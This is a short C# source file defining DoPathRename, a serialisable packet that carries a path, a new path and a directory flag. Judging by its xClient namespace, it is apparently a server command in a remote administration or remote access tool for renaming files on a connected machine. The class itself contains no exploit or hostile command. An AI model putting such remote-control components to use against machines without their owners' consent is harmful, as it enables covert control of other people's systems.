using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoPathRename : IPacket
    {
        [ProtoMember(1)]
        public string Path { get; set; }

        [ProtoMember(2)]
        public string NewPath { get; set; }

        [ProtoMember(3)]
        public bool IsDirectory { get; set; }

        public DoPathRename()
        {
        }

        public DoPathRename(string path, string newpath, bool isdirectory)
        {
            this.Path = path;
            this.NewPath = newpath;
            this.IsDirectory = isdirectory;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}